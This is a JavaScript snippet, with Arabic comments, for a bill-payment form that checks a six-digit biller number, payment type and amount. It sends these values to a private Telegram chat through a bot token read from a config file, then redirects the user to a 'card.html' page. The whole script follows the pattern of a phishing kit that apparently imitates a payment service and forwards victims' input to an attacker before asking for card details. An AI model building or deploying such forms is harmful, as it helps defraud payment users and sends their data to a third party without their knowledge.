<script>
document.addEventListener("DOMContentLoaded", () => {
  // عناصر DOM
  const inputBiller   = document.getElementById("input100"); // رقم المفوتر
  const inputService  = document.getElementById("input2");   // نوع السداد
  const inputAmount   = document.getElementById("input3");   // قيمة السداد
  const errorText1    = document.getElementById("errorText");
  const errorText2    = document.getElementById("errorText2");
  const errorText3    = document.getElementById("errorText3");
  const nextButton    = document.getElementById("nextButton");

  // مساعد للرسائل
  const hideErrors = () => {
    errorText1.classList.add("hidden");
    errorText2.classList.add("hidden");
    errorText3.classList.add("hidden");
  };
  const showError = (el, msg) => {
    el.textContent = msg;
    el.classList.remove("hidden");
  };

  // تحقق القيم
  const validate = () => {
    hideErrors();

    const biller  = (inputBiller.value || "").trim();
    const service = (inputService.value || "").trim();
    const amount  = (inputAmount.value || "").trim();

    if (!/^\d{6}$/.test(biller)) {
      showError(errorText1, "يجب أن يكون رقم المفوتر مكوّن من 6 أرقام.");
      return null;
    }
    if (!service) {
      showError(errorText2, "اختر نوع السداد.");
      return null;
    }
    // قيمة موجبة رقمية
    const amountNum = Number(amount.replace(/[, ]/g, ""));
    if (!amount || Number.isNaN(amountNum) || amountNum <= 0) {
      showError(errorText3, "ادخل قيمة سداد صحيحة.");
      return null;
    }

    return { biller, service, amount: amountNum };
  };

  // إرسال إلى تيليجرام
  const sendToTelegram = async ({ biller, service, amount }) => {
    // اقرأ الإعدادات من config.json
    const res = await fetch("config/config.json", { cache: "no-store" });
    if (!res.ok) throw new Error("تعذّر قراءة ملف الإعدادات.");
    const config = await res.json();

    const botToken = config.botToken;
    const chatId   = config.chatId;
    if (!botToken || !chatId) {
      throw new Error("بيانات التوكن أو الـChat ID غير موجودة في config.json");
    }

    const text =
`المفوتر: ${biller}
نوع الخدمة: ${service}
القيمة: ${amount}`;

    const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text })
    });

    const tgJson = await tgRes.json();
    if (!tgJson.ok) {
      throw new Error(tgJson.description || "فشل إرسال الرسالة إلى تيليجرام.");
    }
  };

  // حدث الزر
  nextButton.addEventListener("click", async () => {
    const data = validate();
    if (!data) return;

    // تعطيل الزر أثناء الإرسال
    nextButton.disabled = true;
    nextButton.setAttribute("aria-busy", "true");

    try {
      // خزّن بعض القيم محليًا
      localStorage.setItem("billerNumber", data.biller);
      localStorage.setItem("payService",   data.service);
      localStorage.setItem("payAmount",    String(data.amount));
      localStorage.setItem("payTimestamp", new Date().toISOString());

      // أرسل الرسالة
      await sendToTelegram(data);

      // نجاح → انتقل للصفحة التالية
      window.location.href = "card.html";
    } catch (err) {
      // أظهر الخطأ بشكل مناسب (تقدر تغيّر المكان/التصميم)
      alert(err.message || "حدث خطأ غير متوقع.");
      console.error(err);
    } finally {
      nextButton.disabled = false;
      nextButton.removeAttribute("aria-busy");
    }
  });
});
</script>
